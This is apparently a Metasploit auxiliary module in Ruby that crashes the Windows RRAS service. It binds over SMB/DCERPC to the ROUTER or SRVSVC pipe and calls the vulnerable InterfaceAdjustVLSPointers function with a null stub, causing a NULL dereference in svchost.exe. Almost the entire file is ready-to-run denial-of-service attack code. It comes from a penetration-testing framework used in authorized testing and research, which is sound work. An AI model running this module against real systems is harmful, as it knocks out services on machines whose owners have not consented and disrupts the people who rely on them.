##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary


  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference',
      'Description'    => %q{
        This module triggers a NULL dereference in svchost.exe on
      all current versions of Windows that run the RRAS service. This
      service is only accessible without authentication on Windows XP
      SP1 (using the SRVSVC pipe).
      },

      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '64340'],

        ],
      'Actions'     =>
        [
          ['Attack'],
        ],
      'DefaultAction' => 'Attack',
      'DisclosureDate' => 'Jun 14 2006'
    ))

    register_options(
      [
        OptString.new('SMBPIPE', [ true,  "The pipe name to use (ROUTER, SRVSVC)", 'ROUTER']),
      ])

  end

  def run
    connect
    smb_login

    case action.name
    when 'Attack'

      handle = dcerpc_handle('8f09f000-b7ed-11ce-bbd2-00001a181cad', '0.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])

      print_status("Binding to #{handle} ...")
      dcerpc_bind(handle)
      print_status("Bound to #{handle} ...")
      stb = [0, 0, 0, 0].pack('V*')

      print_status("Calling the vulnerable function...")
      begin
        dcerpc.call(0x0C, stb)
      rescue Rex::Proto::DCERPC::Exceptions::NoResponse
      rescue => e
        if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
          raise e
        end
      end

    end

    disconnect
  end
end
